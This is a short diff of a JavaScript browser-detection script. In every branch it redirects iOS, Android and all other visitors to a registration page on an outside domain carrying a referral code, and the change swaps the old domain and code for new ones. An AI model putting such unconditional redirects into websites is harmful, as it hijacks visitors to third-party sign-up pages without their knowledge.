@@ -11,9 +11,9 @@ var browser = {
 	} ()
 };
 if (browser.versions.ios || browser.versions.iPhone || browser.versions.iPad) {
-	window.location.href = "http://tcl8win.com/mobile/register?up=TCLS1";
+	window.location.href = "https://www.h25ee.com/#/register?referCode=o9i6mk";
 	}else if (browser.versions.android) {
-	window.location.href = "http://tcl8win.com/mobile/register?up=TCLS1";
+	window.location.href = "https://www.h25ee.com/#/register?referCode=o9i6mk";
 }else{
-	window.location.href = "http://tcl8win.com/mobile/register?up=TCLS1";
+	window.location.href = "https://www.h25ee.com/#/register?referCode=o9i6mk";
 }
